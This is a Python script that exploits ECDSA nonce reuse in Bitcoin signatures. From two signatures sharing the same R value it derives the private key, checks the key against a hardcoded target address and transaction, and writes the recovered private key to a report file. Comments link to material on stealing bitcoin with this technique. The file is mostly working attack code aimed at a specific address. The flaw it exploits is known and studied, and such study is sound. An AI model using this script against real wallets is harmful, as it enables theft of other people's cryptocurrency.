#!/bin/python_3.9

from typing import Set
from bitcoin import *
import subprocess as sp

class RSZ_EXploit():

    def __init__(self) -> None:
        pass

    def exploit(self, address: str, R: str, s1: str, s2: str, z1: str, z2: str) -> Set[str]:
        R_int: int = hash_to_int(R)
        S1_int: int = hash_to_int(s1)
        S2_int: int = hash_to_int(s2)
        z1_int: int = hash_to_int(z1)
        z2_int: int = hash_to_int(z2)
        k_int: int = inv(S2_int - S1_int, N) * (z2_int - z1_int) % N
        d_int: int = inv(R_int, N) * (S1_int * k_int - z1_int) % N
        privkey: str = encode_privkey(d_int, 'wif')
        pubkey: str = privtopub(privkey)
        address2: str = pubtoaddr(pubkey)
        if "nt" in os.name:
                dirk: str = str(sp.getoutput('powershell pwd'))
                dirk = dirk.replace(" ","").replace("\r","").replace("\n","").replace("'","").replace("Path","").replace("--","")
                if "\\btc_exploit" not in dirk:
                    dirk  += "\\btc_exploit"
                dirk = dirk.replace('\\btc_exploit', '\\Reports\\btc_exploit_Repo\\')
        else:
            dirk: str = str(sp.getoutput('pwd'))
            if "/btc_exploit" not in dirk:
                dirk +="/btc_exploit"
            dirk = dirk.replace('/btc_exploit', '/Reports/btc_exploit_Repo/')
        if (address2 == address):
            ExpOut: Set[str] = ("privateKey= ", privkey, " ,address= ", address2, " ,pubkey= ", pubkey)
            with open(dirk + address2 + "_BTC_RowTxID.json", "a") as dop:
                dop.write(str(ExpOut))
                dop.write("\n")
                dop.close()
            return ExpOut
        else:
            ExpOut= ("sorry wrong input")
            return ExpOut

if __name__ == "__main__":
    r: str = "d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1"
    s1: str = "44e1ff2dfd8102cf7a47c21d5c9fd5701610d04953c6836596b4fe9dd2f53e3e"
    z1: str = "c0e2d0a89a348de88fda08211c70d1d7e52ccef2eb9459911bf977d587784c6e"
    s2: str = "9a5f1c75e461d7ceb1cf3cab9013eb2dc85b6d0da8c3c6e27e3a5a5b3faa5bab"
    z2: str = "17b0f41c8c337ac1e18c98759e83a8cccbc368dd9d89e5f03cb633c265fd0ddc"
    address: str = "1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm"
    RSz = RSZ_EXploit()
    RSz_out: Set[str] = RSz.exploit(address,r, s1, s2, z1, z2)
    print(RSz_out)

#txid , "9ec4bc49e828d924af1d1029cacf709431abbde46d59554b62bc270e3b29c4b1"
# pub , "04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff"
#https://iancoleman.io/bitcoin-key-compression/
#https://www.youtube.com/watch?v=f2s3_UG9IPU
#https://speakerdeck.com/filosottile/stealing-bitcoin-with-math-hope-xi?slide=82